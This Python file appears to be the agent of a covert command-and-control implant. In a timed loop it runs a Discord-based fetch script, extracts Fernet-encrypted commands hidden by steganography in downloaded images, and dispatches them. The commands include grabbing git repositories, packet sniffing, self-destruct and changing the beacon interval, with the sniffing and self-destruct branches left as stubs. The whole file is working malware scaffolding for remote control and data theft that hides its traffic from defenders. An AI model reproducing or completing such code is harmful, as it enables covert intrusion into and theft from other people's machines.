from tracemalloc import start
import click
from matplotlib import image
from stegano import lsbset
from stegano import lsb
from stegano.lsbset import generators
from cryptography.fernet import Fernet
from os.path import exists
import os
import packetsniff

import time
import json
import sys

f = open('secrets.json')
secrets = json.load(f)

f = open("commands.json")
sub_table = json.load(f)


SLEEP_TIME = 5

def extract_message(image):
    return lsb.reveal(image)

def decrypt_message(message, key):
    f = Fernet(key)
    return f.decrypt(message.encode()).decode()

def unwrap_command(embedded_command, key):
    command_ciphertext = extract_message(embedded_command)
    command = decrypt_message(command_ciphertext, key)
    return command

def fetch_command():
    os.system('python3 ./c2_discord.py')
    if exists(secrets["IMAGE_DOWNLOAD_PATH"]):
        command = unwrap_command(secrets["IMAGE_DOWNLOAD_PATH"], secrets["ENCRYPTION_KEY"])
        os.remove(secrets["IMAGE_DOWNLOAD_PATH"])
    else:
        command = None
    return command

def parse_command(command):
    tokens = command.split(" ")
    if len(tokens) < 1:
        return
    if tokens[0] in sub_table.keys():
        keyphrase = sub_table[tokens[0]]
    else:
        print("invalid command")
        return
    
    if keyphrase == "sniff":
        if len(tokens) < 2:
            print('missing arguments')
            return
        #insert sniff toggle here
    elif keyphrase == "repos":
        packetsniff.get_git_repos()
    elif keyphrase == "sd":
        if len(tokens) < 2:
            print('missing arguments')
            return
        #insert self destruct code here
    elif keyphrase == "setsleep":
        if len(tokens) < 2:
            print('missing arguments')
            return
        global SLEEP_TIME
        SLEEP_TIME = int(tokens[1])
        print(f'Set SleepTime to {SLEEP_TIME}')

while True:
    time.sleep(SLEEP_TIME)

    print('Fetching image ...')

    command = fetch_command()

    if command is not None:
        print(f'Command recieved! {command}')
        parse_command(command)
    else:
        print('Nothing found')

